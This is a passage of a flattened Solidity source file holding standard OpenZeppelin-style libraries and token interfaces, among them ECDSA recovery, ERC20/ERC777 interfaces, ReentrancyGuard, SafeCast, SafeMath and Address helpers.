https://github.com/ethereum/solidity/issues/2691\n\n        return msg.data;\n\n    }\n\n}\n\nlibrary ECDSA {\n\n    /**\n\n     * @dev Returns the address that signed a hashed message (`hash`) with\n\n     * `signature`. This address can then be used for verification purposes.\n\n     *\n\n     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:\n\n     * this function rejects them by requiring the `s` value to be in the lower\n\n     * half order, and the `v` value to be either 27 or 28.\n\n     *\n\n     * IMPORTANT: `hash` _must_ be the result of a hash operation for the\n\n     * verification to be secure: it is possible to craft signatures that\n\n     * recover to arbitrary addresses for non-hashed data. A safe way to ensure\n\n     * this is by receiving a hash of the original message (which may otherwise\n\n     * be too long), and then calling {toEthSignedMessageHash} on it.\n\n     */\n\n    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {\n\n        // Check the signature length\n\n        if (signature.length != 65) {\n\n            revert("ECDSA: invalid signature length");\n\n        }\n\n\n\n        // Divide the signature in r, s and v variables\n\n        bytes32 r;\n\n        bytes32 s;\n\n        uint8 v;\n\n\n\n        // ecrecover takes the signature parameters, and the only way to get them\n\n        // currently is to use assembly.\n\n        // solhint-disable-next-line no-inline-assembly\n\n        assembly {\n\n            r := mload(add(signature, 0x20))\n\n            s := mload(add(signature, 0x40))\n\n            v := byte(0, mload(add(signature, 0x60)))\n\n        }\n\n\n\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n\n        // the valid range for s in (281): 0 < s < secp256k1n ¡Â 2 + 1, and for v in (282): v ¡Ê {27, 28}. Most\n\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n\n        //\n\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n\n        // these malleable signatures as well.\n\n        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {\n\n            revert("ECDSA: invalid signature \'s\' value");\n\n        }\n\n\n\n        if (v != 27 && v != 28) {\n\n            revert("ECDSA: invalid signature \'v\' value");\n\n        }\n\n\n\n        // If the signature is valid (and not malleable), return the signer address\n\n        address signer = ecrecover(hash, v, r, s);\n\n        require(signer != address(0), "ECDSA: invalid signature");\n\n\n\n        return signer;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns an Ethereum Signed Message, created from a `hash`. This\n\n     * replicates the behavior of the\n\n     * https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_sign[`eth_sign`]\n\n     * JSON-RPC method.\n\n     *\n\n     * See {recover}.\n\n     */\n\n    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {\n\n        // 32 is the length in bytes of hash,\n\n        // enforced by the type signature above\n\n        return keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", hash));\n\n    }\n\n}\n\n\n\ninterface IERC1820Registry {\n\n    /**\n\n     * @dev Sets `newManager` as the manager for `account`. A manager of an\n\n     * account is able to set interface implementers for it.\n\n     *\n\n     * By default, each account is its own manager. Passing a value of `0x0` in\n\n     * `newManager` will reset the manager to this initial state.\n\n     *\n\n     * Emits a {ManagerChanged} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must be the current manager for `account`.\n\n     */\n\n    function setManager(address account, address newManager) external;\n\n\n\n    /**\n\n     * @dev Returns the manager for `account`.\n\n     *\n\n     * See {setManager}.\n\n     */\n\n    function getManager(address account) external view returns (address);\n\n\n\n    /**\n\n     * @dev Sets the `implementer` contract as ``account``\'s implementer for\n\n     * `interfaceHash`.\n\n     *\n\n     * `account` being the zero address is an alias for the caller\'s address.\n\n     * The zero address can also be used in `implementer` to remove an old one.\n\n     *\n\n     * See {interfaceHash} to learn how these are created.\n\n     *\n\n     * Emits an {InterfaceImplementerSet} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must be the current manager for `account`.\n\n     * - `interfaceHash` must not be an {IERC165} interface id (i.e. it must not\n\n     * end in 28 zeroes).\n\n     * - `implementer` must implement {IERC1820Implementer} and return true when\n\n     * queried for support, unless `implementer` is the caller. See\n\n     * {IERC1820Implementer-canImplementInterfaceForAddress}.\n\n     */\n\n    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;\n\n\n\n    /**\n\n     * @dev Returns the implementer of `interfaceHash` for `account`. If no such\n\n     * implementer is registered, returns the zero address.\n\n     *\n\n     * If `interfaceHash` is an {IERC165} interface id (i.e. it ends with 28\n\n     * zeroes), `account` will be queried for support of it.\n\n     *\n\n     * `account` being the zero address is an alias for the caller\'s address.\n\n     */\n\n    function getInterfaceImplementer(address account, bytes32 interfaceHash) external view returns (address);\n\n\n\n    /**\n\n     * @dev Returns the interface hash for an `interfaceName`, as defined in the\n\n     * corresponding\n\n     * https://eips.ethereum.org/EIPS/eip-1820#interface-name[section of the EIP].\n\n     */\n\n    function interfaceHash(string calldata interfaceName) external pure returns (bytes32);\n\n\n\n    /**\n\n     *  @notice Updates the cache with whether the contract implements an ERC165 interface or not.\n\n     *  @param account Address of the contract for which to update the cache.\n\n     *  @param interfaceId ERC165 interface for which to update the cache.\n\n     */\n\n    function updateERC165Cache(address account, bytes4 interfaceId) external;\n\n\n\n    /**\n\n     *  @notice Checks whether a contract implements an ERC165 interface or not.\n\n     *  If the result is not cached a direct lookup on the contract address is performed.\n\n     *  If the result is not cached or the cached value is out-of-date, the cache MUST be updated manually by calling\n\n     *  {updateERC165Cache} with the contract address.\n\n     *  @param account Address of the contract to check.\n\n     *  @param interfaceId ERC165 interface to check.\n\n     *  @return True if `account` implements `interfaceId`, false otherwise.\n\n     */\n\n    function implementsERC165Interface(address account, bytes4 interfaceId) external view returns (bool);\n\n\n\n    /**\n\n     *  @notice Checks whether a contract implements an ERC165 interface or not without using nor updating the cache.\n\n     *  @param account Address of the contract to check.\n\n     *  @param interfaceId ERC165 interface to check.\n\n     *  @return True if `account` implements `interfaceId`, false otherwise.\n\n     */\n\n    function implementsERC165InterfaceNoCache(address account, bytes4 interfaceId) external view returns (bool);\n\n\n\n    event InterfaceImplementerSet(address indexed account, bytes32 indexed interfaceHash, address indexed implementer);\n\n\n\n    event ManagerChanged(address indexed account, address indexed newManager);\n\n}\n\ninterface IERC20 {\n\n    /**\n\n     * @dev Returns the amount of tokens in existence.\n\n     */\n\n    function totalSupply() external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Returns the amount of tokens owned by `account`.\n\n     */\n\n    function balanceOf(address account) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from the caller\'s account to `recipient`.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     */\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Returns the remaining number of tokens that `spender` will be\n\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n\n     * zero by default.\n\n     *\n\n     * This value changes when {approve} or {transferFrom} are called.\n\n     */\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Sets `amount` as the allowance of `spender` over the caller\'s tokens.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n\n     * that someone may use both the old and the new allowance by unfortunate\n\n     * transaction ordering. One possible solution to mitigate this race\n\n     * condition is to first reduce the spender\'s allowance to 0 and set the\n\n     * desired value afterwards:\n\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n\n     *\n\n     * Emits an {Approval} event.\n\n     */\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n\n     * allowance mechanism. `amount` is then deducted from the caller\'s\n\n     * allowance.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     */\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n\n     * another (`to`).\n\n     *\n\n     * Note that `value` may be zero.\n\n     */\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n\n    /**\n\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n\n     * a call to {approve}. `value` is the new allowance.\n\n     */\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n}\n\ninterface IERC777 {\n\n    /**\n\n     * @dev Returns the name of the token.\n\n     */\n\n    function name() external view returns (string memory);\n\n\n\n    /**\n\n     * @dev Returns the symbol of the token, usually a shorter version of the\n\n     * name.\n\n     */\n\n    function symbol() external view returns (string memory);\n\n\n\n    /**\n\n     * @dev Returns the smallest part of the token that is not divisible. This\n\n     * means all token operations (creation, movement and destruction) must have\n\n     * amounts that are a multiple of this number.\n\n     *\n\n     * For most token contracts, this value will equal 1.\n\n     */\n\n    function granularity() external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Returns the amount of tokens in existence.\n\n     */\n\n    function totalSupply() external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Returns the amount of tokens owned by an account (`owner`).\n\n     */\n\n    function balanceOf(address owner) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from the caller\'s account to `recipient`.\n\n     *\n\n     * If send or receive hooks are registered for the caller and `recipient`,\n\n     * the corresponding functions will be called with `data` and empty\n\n     * `operatorData`. See {IERC777Sender} and {IERC777Recipient}.\n\n     *\n\n     * Emits a {Sent} event.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - the caller must have at least `amount` tokens.\n\n     * - `recipient` cannot be the zero address.\n\n     * - if `recipient` is a contract, it must implement the {IERC777Recipient}\n\n     * interface.\n\n     */\n\n    function send(address recipient, uint256 amount, bytes calldata data) external;\n\n\n\n    /**\n\n     * @dev Destroys `amount` tokens from the caller\'s account, reducing the\n\n     * total supply.\n\n     *\n\n     * If a send hook is registered for the caller, the corresponding function\n\n     * will be called with `data` and empty `operatorData`. See {IERC777Sender}.\n\n     *\n\n     * Emits a {Burned} event.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - the caller must have at least `amount` tokens.\n\n     */\n\n    function burn(uint256 amount, bytes calldata data) external;\n\n\n\n    /**\n\n     * @dev Returns true if an account is an operator of `tokenHolder`.\n\n     * Operators can send and burn tokens on behalf of their owners. All\n\n     * accounts are their own operator.\n\n     *\n\n     * See {operatorSend} and {operatorBurn}.\n\n     */\n\n    function isOperatorFor(address operator, address tokenHolder) external view returns (bool);\n\n\n\n    /**\n\n     * @dev Make an account an operator of the caller.\n\n     *\n\n     * See {isOperatorFor}.\n\n     *\n\n     * Emits an {AuthorizedOperator} event.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `operator` cannot be calling address.\n\n     */\n\n    function authorizeOperator(address operator) external;\n\n\n\n    /**\n\n     * @dev Revoke an account\'s operator status for the caller.\n\n     *\n\n     * See {isOperatorFor} and {defaultOperators}.\n\n     *\n\n     * Emits a {RevokedOperator} event.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `operator` cannot be calling address.\n\n     */\n\n    function revokeOperator(address operator) external;\n\n\n\n    /**\n\n     * @dev Returns the list of default operators. These accounts are operators\n\n     * for all token holders, even if {authorizeOperator} was never called on\n\n     * them.\n\n     *\n\n     * This list is immutable, but individual holders may revoke these via\n\n     * {revokeOperator}, in which case {isOperatorFor} will return false.\n\n     */\n\n    function defaultOperators() external view returns (address[] memory);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from `sender` to `recipient`. The caller must\n\n     * be an operator of `sender`.\n\n     *\n\n     * If send or receive hooks are registered for `sender` and `recipient`,\n\n     * the corresponding functions will be called with `data` and\n\n     * `operatorData`. See {IERC777Sender} and {IERC777Recipient}.\n\n     *\n\n     * Emits a {Sent} event.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `sender` cannot be the zero address.\n\n     * - `sender` must have at least `amount` tokens.\n\n     * - the caller must be an operator for `sender`.\n\n     * - `recipient` cannot be the zero address.\n\n     * - if `recipient` is a contract, it must implement the {IERC777Recipient}\n\n     * interface.\n\n     */\n\n    function operatorSend(\n\n        address sender,\n\n        address recipient,\n\n        uint256 amount,\n\n        bytes calldata data,\n\n        bytes calldata operatorData\n\n    ) external;\n\n\n\n    /**\n\n     * @dev Destroys `amount` tokens from `account`, reducing the total supply.\n\n     * The caller must be an operator of `account`.\n\n     *\n\n     * If a send hook is registered for `account`, the corresponding function\n\n     * will be called with `data` and `operatorData`. See {IERC777Sender}.\n\n     *\n\n     * Emits a {Burned} event.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `account` cannot be the zero address.\n\n     * - `account` must have at least `amount` tokens.\n\n     * - the caller must be an operator for `account`.\n\n     */\n\n    function operatorBurn(\n\n        address account,\n\n        uint256 amount,\n\n        bytes calldata data,\n\n        bytes calldata operatorData\n\n    ) external;\n\n\n\n    event Sent(\n\n        address indexed operator,\n\n        address indexed from,\n\n        address indexed to,\n\n        uint256 amount,\n\n        bytes data,\n\n        bytes operatorData\n\n    );\n\n\n\n    event Minted(address indexed operator, address indexed to, uint256 amount, bytes data, bytes operatorData);\n\n\n\n    event Burned(address indexed operator, address indexed from, uint256 amount, bytes data, bytes operatorData);\n\n\n\n    event AuthorizedOperator(address indexed operator, address indexed tokenHolder);\n\n\n\n    event RevokedOperator(address indexed operator, address indexed tokenHolder);\n\n}\n\ninterface IERC777Recipient {\n\n    /**\n\n     * @dev Called by an {IERC777} token contract whenever tokens are being\n\n     * moved or created into a registered account (`to`). The type of operation\n\n     * is conveyed by `from` being the zero address or not.\n\n     *\n\n     * This call occurs _after_ the token contract\'s state is updated, so\n\n     * {IERC777-balanceOf}, etc., can be used to query the post-operation state.\n\n     *\n\n     * This function may revert to prevent the operation from being executed.\n\n     */\n\n    function tokensReceived(\n\n        address operator,\n\n        address from,\n\n        address to,\n\n        uint256 amount,\n\n        bytes calldata userData,\n\n        bytes calldata operatorData\n\n    ) external;\n\n}\n\ninterface IERC777Sender {\n\n    /**\n\n     * @dev Called by an {IERC777} token contract whenever a registered holder\'s\n\n     * (`from`) tokens are about to be moved or destroyed. The type of operation\n\n     * is conveyed by `to` being the zero address or not.\n\n     *\n\n     * This call occurs _before_ the token contract\'s state is updated, so\n\n     * {IERC777-balanceOf}, etc., can be used to query the pre-operation state.\n\n     *\n\n     * This function may revert to prevent the operation from being executed.\n\n     */\n\n    function tokensToSend(\n\n        address operator,\n\n        address from,\n\n        address to,\n\n        uint256 amount,\n\n        bytes calldata userData,\n\n        bytes calldata operatorData\n\n    ) external;\n\n}\n\ncontract ReentrancyGuard {\n\n    // Booleans are more expensive than uint256 or any type that takes up a full\n\n    // word because each write operation emits an extra SLOAD to first read the\n\n    // slot\'s contents, replace the bits taken up by the boolean, and then write\n\n    // back. This is the compiler\'s defense against contract upgrades and\n\n    // pointer aliasing, and it cannot be disabled.\n\n\n\n    // The values being non-zero value makes deployment a bit more expensive,\n\n    // but in exchange the refund on every call to nonReentrant will be lower in\n\n    // amount. Since refunds are capped to a percentage of the total\n\n    // transaction\'s gas, it is best to keep them low in cases like this one, to\n\n    // increase the likelihood of the full refund coming into effect.\n\n    uint256 private constant _NOT_ENTERED = 1;\n\n    uint256 private constant _ENTERED = 2;\n\n\n\n    uint256 private _status;\n\n\n\n    constructor () internal {\n\n        _status = _NOT_ENTERED;\n\n    }\n\n\n\n    /**\n\n     * @dev Prevents a contract from calling itself, directly or indirectly.\n\n     * Calling a `nonReentrant` function from another `nonReentrant`\n\n     * function is not supported. It is possible to prevent this from happening\n\n     * by making the `nonReentrant` function external, and make it call a\n\n     * `private` function that does the actual work.\n\n     */\n\n    modifier nonReentrant() {\n\n        // On the first call to nonReentrant, _notEntered will be true\n\n        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");\n\n\n\n        // Any calls to nonReentrant after this point will fail\n\n        _status = _ENTERED;\n\n\n\n        _;\n\n\n\n        // By storing the original value once again, a refund is triggered (see\n\n        // https://eips.ethereum.org/EIPS/eip-2200)\n\n        _status = _NOT_ENTERED;\n\n    }\n\n}\n\nlibrary SafeCast {\n\n\n\n    /**\n\n     * @dev Returns the downcasted uint128 from uint256, reverting on\n\n     * overflow (when the input is greater than largest uint128).\n\n     *\n\n     * Counterpart to Solidity\'s `uint128` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 128 bits\n\n     */\n\n    function toUint128(uint256 value) internal pure returns (uint128) {\n\n        require(value < 2**128, "SafeCast: value doesn\\\'t fit in 128 bits");\n\n        return uint128(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted uint64 from uint256, reverting on\n\n     * overflow (when the input is greater than largest uint64).\n\n     *\n\n     * Counterpart to Solidity\'s `uint64` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 64 bits\n\n     */\n\n    function toUint64(uint256 value) internal pure returns (uint64) {\n\n        require(value < 2**64, "SafeCast: value doesn\\\'t fit in 64 bits");\n\n        return uint64(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted uint32 from uint256, reverting on\n\n     * overflow (when the input is greater than largest uint32).\n\n     *\n\n     * Counterpart to Solidity\'s `uint32` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 32 bits\n\n     */\n\n    function toUint32(uint256 value) internal pure returns (uint32) {\n\n        require(value < 2**32, "SafeCast: value doesn\\\'t fit in 32 bits");\n\n        return uint32(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted uint16 from uint256, reverting on\n\n     * overflow (when the input is greater than largest uint16).\n\n     *\n\n     * Counterpart to Solidity\'s `uint16` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 16 bits\n\n     */\n\n    function toUint16(uint256 value) internal pure returns (uint16) {\n\n        require(value < 2**16, "SafeCast: value doesn\\\'t fit in 16 bits");\n\n        return uint16(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted uint8 from uint256, reverting on\n\n     * overflow (when the input is greater than largest uint8).\n\n     *\n\n     * Counterpart to Solidity\'s `uint8` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 8 bits.\n\n     */\n\n    function toUint8(uint256 value) internal pure returns (uint8) {\n\n        require(value < 2**8, "SafeCast: value doesn\\\'t fit in 8 bits");\n\n        return uint8(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Converts a signed int256 into an unsigned uint256.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must be greater than or equal to 0.\n\n     */\n\n    function toUint256(int256 value) internal pure returns (uint256) {\n\n        require(value >= 0, "SafeCast: value must be positive");\n\n        return uint256(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted int128 from int256, reverting on\n\n     * overflow (when the input is less than smallest int128 or\n\n     * greater than largest int128).\n\n     *\n\n     * Counterpart to Solidity\'s `int128` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 128 bits\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function toInt128(int256 value) internal pure returns (int128) {\n\n        require(value >= -2**127 && value < 2**127, "SafeCast: value doesn\\\'t fit in 128 bits");\n\n        return int128(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted int64 from int256, reverting on\n\n     * overflow (when the input is less than smallest int64 or\n\n     * greater than largest int64).\n\n     *\n\n     * Counterpart to Solidity\'s `int64` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 64 bits\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function toInt64(int256 value) internal pure returns (int64) {\n\n        require(value >= -2**63 && value < 2**63, "SafeCast: value doesn\\\'t fit in 64 bits");\n\n        return int64(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted int32 from int256, reverting on\n\n     * overflow (when the input is less than smallest int32 or\n\n     * greater than largest int32).\n\n     *\n\n     * Counterpart to Solidity\'s `int32` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 32 bits\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function toInt32(int256 value) internal pure returns (int32) {\n\n        require(value >= -2**31 && value < 2**31, "SafeCast: value doesn\\\'t fit in 32 bits");\n\n        return int32(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted int16 from int256, reverting on\n\n     * overflow (when the input is less than smallest int16 or\n\n     * greater than largest int16).\n\n     *\n\n     * Counterpart to Solidity\'s `int16` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 16 bits\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function toInt16(int256 value) internal pure returns (int16) {\n\n        require(value >= -2**15 && value < 2**15, "SafeCast: value doesn\\\'t fit in 16 bits");\n\n        return int16(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the downcasted int8 from int256, reverting on\n\n     * overflow (when the input is less than smallest int8 or\n\n     * greater than largest int8).\n\n     *\n\n     * Counterpart to Solidity\'s `int8` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must fit into 8 bits.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function toInt8(int256 value) internal pure returns (int8) {\n\n        require(value >= -2**7 && value < 2**7, "SafeCast: value doesn\\\'t fit in 8 bits");\n\n        return int8(value);\n\n    }\n\n\n\n    /**\n\n     * @dev Converts an unsigned uint256 into a signed int256.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - input must be less than or equal to maxInt256.\n\n     */\n\n    function toInt256(uint256 value) internal pure returns (int256) {\n\n        require(value < 2**255, "SafeCast: value doesn\'t fit in an int256");\n\n        return int256(value);\n\n    }\n\n}\n\nlibrary SafeMath {\n\n    /**\n\n     * @dev Returns the addition of two unsigned integers, reverting on\n\n     * overflow.\n\n     *\n\n     * Counterpart to Solidity\'s `+` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Addition cannot overflow.\n\n     */\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        uint256 c = a + b;\n\n        require(c >= a, "SafeMath: addition overflow");\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n\n     * overflow (when the result is negative).\n\n     *\n\n     * Counterpart to Solidity\'s `-` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Subtraction cannot overflow.\n\n     */\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return sub(a, b, "SafeMath: subtraction overflow");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n\n     * overflow (when the result is negative).\n\n     *\n\n     * Counterpart to Solidity\'s `-` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Subtraction cannot overflow.\n\n     */\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b <= a, errorMessage);\n\n        uint256 c = a - b;\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n\n     * overflow.\n\n     *\n\n     * Counterpart to Solidity\'s `*` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Multiplication cannot overflow.\n\n     */\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        // Gas optimization: this is cheaper than requiring \'a\' not being zero, but the\n\n        // benefit is lost if \'b\' is also tested.\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n\n        if (a == 0) {\n\n            return 0;\n\n        }\n\n\n\n        uint256 c = a * b;\n\n        require(c / a == b, "SafeMath: multiplication overflow");\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n\n     * division by zero. The result is rounded towards zero.\n\n     *\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return div(a, b, "SafeMath: division by zero");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n\n     * division by zero. The result is rounded towards zero.\n\n     *\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b > 0, errorMessage);\n\n        uint256 c = a / b;\n\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n     * Reverts when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return mod(a, b, "SafeMath: modulo by zero");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n     * Reverts with custom message when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b != 0, errorMessage);\n\n        return a % b;\n\n    }\n\n}\n\nlibrary Address {\n\n    /**\n\n     * @dev Returns true if `account` is a contract.\n\n     *\n\n     * [IMPORTANT]\n\n     * ====\n\n     * It is unsafe to assume that an address for which this function returns\n\n     * false is an externally-owned account (EOA) and not a contract.\n\n     *\n\n     * Among others, `isContract` will return false for the following\n\n     * types of addresses:\n\n     *\n\n     *  - an externally-owned account\n\n     *  - a contract in construction\n\n     *  - an address where a contract will be created\n\n     *  - an address where a contract lived, but was destroyed\n\n     * ====\n\n     */\n\n    function isContract(address account) internal view returns (bool) {\n\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n\n        // for accounts without code, i.e. `keccak256(\'\')`\n\n        bytes32 codehash;\n\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n\n        // solhint-disable-next-line no-inline-assembly\n\n        assembly { codehash := extcodehash(account) }\n\n        return (codehash != accountHash && codehash != 0x0);\n\n    }\n\n\n\n    /**\n\n     * @dev Replacement for Solidity\'s `transfer`: sends `amount` wei to\n\n     * `recipient`, forwarding all available gas and reverting on errors.\n\n     *\n\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n\n     * imposed by `transfer`, making them unable to receive funds via\n\n     * `transfer`. {sendValue} removes this limitation.\n\n     *\n\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n\n     *\n\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n\n     * taken to not create reentrancy vulnerabilities. Consider using\n\n     * {ReentrancyGuard} or the\n\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n\n     */\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n\n        require(address(this).balance >= amount, "Address: insufficient balance");\n\n\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n\n        (bool success, ) = recipient.call{ value: amount }("");\n\n        require(success, "Address: unable to send value, recipient may have reverted");\n\n    }\n\n}\n\nlibrary EnumerableSet {\n\n    // To implement this library for multiple types with as little code\n\n    // repetition as possible, we write it in terms of a generic Set type with\n\n    // bytes32 values.\n\n    // The Set implementation uses private functions, and user-facing\n\n    // implementations (such as AddressSet) are just wrappers around the\n\n    // underlying Set.\n\n    // This means that we can only create new EnumerableSets for types that fit\n\n    // in bytes32.\n\n\n\n    struct Set {\n\n        // Storage of set values\n\n        bytes32[] _values;\n\n\n\n        // Position of the value in the `values` array, plus 1 because index 0\n\n        // means a value is not in the set.\n\n        mapping (bytes32 => uint256) _indexes;\n\n    }\n\n\n\n    /**\n\n     * @dev Add a value to a set. O(1).\n\n     *\n\n     * Returns true if the value was added to the set, that is if it was not\n\n     * already present.\n\n     */\n\n    function _add(Set storage set, bytes32 value) private returns (bool) {\n\n        if (!_contains(set, value)) {\n\n            set._values.push(value);\n\n            // The value is stored at length-1, but we add 1 to all indexes\n\n            // and use 0 as a sentinel value\n\n            set._indexes[value] = set._values.length;\n\n            return true;\n\n        } else {\n\n            return false;\n\n        }\n\n    }\n\n\n\n    